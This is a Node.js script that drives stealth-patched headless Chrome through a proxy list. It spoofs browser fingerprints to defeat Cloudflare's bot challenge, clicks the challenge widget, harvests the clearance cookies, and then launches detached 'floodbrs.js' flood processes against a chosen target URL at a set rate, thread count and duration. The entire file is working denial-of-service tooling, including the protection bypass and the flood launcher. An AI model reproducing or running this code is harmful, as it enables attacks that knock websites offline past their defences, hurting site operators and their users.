const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m', 
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== ENHANCED CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Mask automation
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        
        // Overwrite plugins
        Object.defineProperty(navigator, 'plugins', {
            get: () => [
                {
                    0: {type: "application/x-google-chrome-pdf"},
                    name: "Chrome PDF Plugin", 
                    filename: "internal-pdf-viewer",
                    description: "Portable Document Format"
                }
            ]
        });

        // Overwrite languages
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });

        // Mock chrome runtime
        window.chrome = {
            runtime: {
                connect: () => ({
                    onMessage: {addListener: () => {}},
                    postMessage: () => {},
                    onDisconnect: {addListener: () => {}}
                }),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                getManifest: () => ({})
            },
            loadTimes: () => ({
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0
            }),
            csi: () => ({onloadT: Date.now()}),
            app: { isInstalled: false }
        };

        // Overwrite permissions
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => 
            parameters.name === 'notifications' ? 
            Promise.resolve({ state: Notification.permission }) : 
            originalQuery(parameters);

        // Hardware properties
        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 0 });
        
        // Document properties
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });

        // Delete automation markers
        const automationProps = [
            '__webdriver_evaluate', '__selenium_evaluate', '__webdriver_script_function',
            '__webdriver_script_func', '__webdriver_script_fn', '_Selenium_IDE_Recorder',
            '_selenium', 'callPhantom', 'callSelenium', 'phantom', 'webdriver',
            'selenium', '_phantom'
        ];
        automationProps.forEach(prop => delete window[prop]);
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox', 
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-sync',
    '--aggressive-cache-discard',
    '--window-size=1920,1080'
];

// REAL COOKIE EXTRACTION - NO GENERATION
const extractRealCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Extracting REAL cookies from page: ${maskProxy(browserProxy)}`);
        
        // Wait for page to fully load
        await sleep(8);
        
        // STRATEGY 1: Extract from target domain
        let cookies = await page.cookies(targetURL).catch(() => []);
        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got target domain cookies: ${maskProxy(browserProxy)}`);
            const cookieNames = cookies.map(c => c.name).join(', ');
            coloredLog(COLORS.PINK, `[COOKIES] Found: ${cookieNames}`);
            return { 
                success: true, 
                cookies: cookieString, 
                strategy: 'target_domain',
                count: cookies.length
            };
        }
        
        // STRATEGY 2: Extract all cookies from browser
        cookies = await page.cookies().catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got all domain cookies: ${maskProxy(browserProxy)}`);
            const cookieNames = cookies.map(c => c.name).join(', ');
            coloredLog(COLORS.PINK, `[COOKIES] Found: ${cookieNames}`);
            return { 
                success: true, 
                cookies: cookieString, 
                strategy: 'all_domains',
                count: cookies.length
            };
        }
        
        // STRATEGY 3: Wait longer and retry extraction
        coloredLog(COLORS.YELLOW, `[COOKIES] Waiting longer for cookies: ${maskProxy(browserProxy)}`);
        await sleep(10);
        
        cookies = await page.cookies(targetURL).catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got cookies after wait: ${maskProxy(browserProxy)}`);
            return { 
                success: true, 
                cookies: cookieString, 
                strategy: 'delayed_extraction',
                count: cookies.length
            };
        }
        
        // STRATEGY 4: Navigate again and extract
        coloredLog(COLORS.YELLOW, `[COOKIES] Re-navigating for cookies: ${maskProxy(browserProxy)}`);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(8);
        
        cookies = await page.cookies(targetURL).catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[COOKIES] Got cookies after re-navigation: ${maskProxy(browserProxy)}`);
            return { 
                success: true, 
                cookies: cookieString, 
                strategy: 'renavigation',
                count: cookies.length
            };
        }
        
        // FINAL STRATEGY: Return empty cookies but don't fail
        coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, continuing without: ${maskProxy(browserProxy)}`);
        return { 
            success: true, 
            cookies: '', 
            strategy: 'no_cookies_found',
            count: 0
        };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Extraction error: ${error.message}`);
        // Don't fail, just return empty
        return { 
            success: true, 
            cookies: '', 
            strategy: 'error_recovery',
            count: 0
        };
    }
};

// IMPROVED CHALLENGE SOLVER
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting challenge solver: ${maskProxy(browserProxy)}`);
        
        // Initial wait
        await sleep(8);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        let content = await page.content().catch(() => '');
        
        // Check if already passed
        const isPassed = !title.includes('Just a moment') && 
                        !title.includes('Checking your browser') && 
                        !currentUrl.includes('challenges.cloudflare.com') &&
                        content.length > 100;
        
        if (isPassed) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Challenge detected: ${maskProxy(browserProxy)}`);
        
        // STRATEGY 1: Extended wait for auto-solve
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 1: Extended wait (20s)`);
        await sleep(20);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'auto_solve' };
        }
        
        // STRATEGY 2: Iframe interaction
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 2: Iframe interaction`);
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameUrl = frame.url();
                    if (frameUrl.includes('challenges.cloudflare.com')) {
                        coloredLog(COLORS.YELLOW, `[SOLVER] Found Cloudflare iframe`);
                        
                        // Try to find and interact with challenge elements
                        const selectors = [
                            'input[type="checkbox"]',
                            '.cf-challenge-checkbox', 
                            '[role="checkbox"]',
                            'button',
                            'input[type="submit"]',
                            '.btn',
                            '.verify-btn'
                        ];
                        
                        for (const selector of selectors) {
                            const element = await frame.$(selector);
                            if (element) {
                                await element.click().catch(() => {});
                                coloredLog(COLORS.YELLOW, `[SOLVER] Clicked: ${selector}`);
                                await sleep(10);
                                break;
                            }
                        }
                        
                        // Check if solved after interaction
                        currentUrl = page.url();
                        title = await page.title().catch(() => '');
                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                            coloredLog(COLORS.GREEN, `[SOLVER] Iframe interaction successful`);
                            return { solved: true, scenario: 'iframe_interaction' };
                        }
                    }
                } catch (e) {}
            }
        } catch (e) {
            coloredLog(COLORS.RED, `[SOLVER] Iframe error: ${e.message}`);
        }
        
        // STRATEGY 3: Refresh and retry
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 3: Refresh and retry`);
        await page.reload().catch(() => {});
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Refresh successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'refresh_success' };
        }
        
        // STRATEGY 4: Direct navigation bypass
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 4: Direct navigation`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 45000 
        }).catch(() => {});
        
        await sleep(10);
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Direct navigation successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_navigation' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] All strategies failed: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'all_failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Received Ctrl+C, cleaning up...');
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Error killing node.exe: ${err.message}`);
        }
    });
    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`
];

// REAL COOKIE BROWSER LAUNCHER
const launchRealCookieBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[LAUNCH] Starting browser: ${maskProxy(browserProxy)}`);
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply anti-detection
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge if present
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error(`Challenge solving failed: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);

        // Extract REAL cookies from page (NO GENERATION)
        const cookieResult = await extractRealCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success) {
            throw new Error('Cookie extraction failed completely');
        }

        coloredLog(COLORS.GREEN, `[COOKIES] Obtained via ${cookieResult.strategy}: ${maskProxy(browserProxy)}`);
        coloredLog(COLORS.PINK, `[COOKIES] Cookie count: ${cookieResult.count}`);
        
        // Log cookie details (truncated for security)
        if (cookieResult.cookies && cookieResult.cookies.length > 0) {
            const cookiePreview = cookieResult.cookies.substring(0, 100) + '...';
            coloredLog(COLORS.WHITE, `[COOKIES] Preview: ${cookiePreview}`);
        }

        totalSolves++;
        coloredLog(COLORS.GREEN, `[STATS] Total successful solves: ${totalSolves}`);

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent,
            scenario: challengeResult.scenario,
            cookieStrategy: cookieResult.strategy,
            cookieCount: cookieResult.count
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(5);
            return launchRealCookieBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)} - ${error.message}`);
        return null;
    }
};

// Thread handling dengan REAL cookies
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task });
        return;
    }

    try {
        const response = await launchRealCookieBrowser(targetURL, browserProxy);
        
        if (response) {
            const resultInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                Scenario: response.scenario,
                CookieStrategy: response.cookieStrategy,
                CookieCount: response.cookieCount,
                cookie: response.cookies
            });
            
            console.log(resultInfo);

            // SPAWN FLOOD PROCESS DENGAN REAL COOKIES
            try {
                coloredLog(COLORS.YELLOW, `[FLOOD] Spawning with REAL cookies: ${maskProxy(browserProxy)}`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies, // REAL cookies dari web
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[FLOOD] Process spawned: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[FLOOD] Spawn error: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[COMPLETE] All proxies processed with REAL cookies');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Real Cookie Specialist with ${proxies.length} proxies`);
    coloredLog(COLORS.WHITE, `[INFO] Target: ${targetURL}`);
    coloredLog(COLORS.WHITE, `[INFO] Duration: ${duration}s, Threads: ${threads}, Rate: ${rate}`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed - cleaning up...');
        queue.kill();
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});
        
        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[SHUTDOWN] Mission complete - REAL cookies extracted');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🚀 REAL COOKIE EXTRACTION SPECIALIST ACTIVATED 🚀');
coloredLog(COLORS.WHITE, '[INFO] Strategy: Extract REAL cookies from website, NO generation');

main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
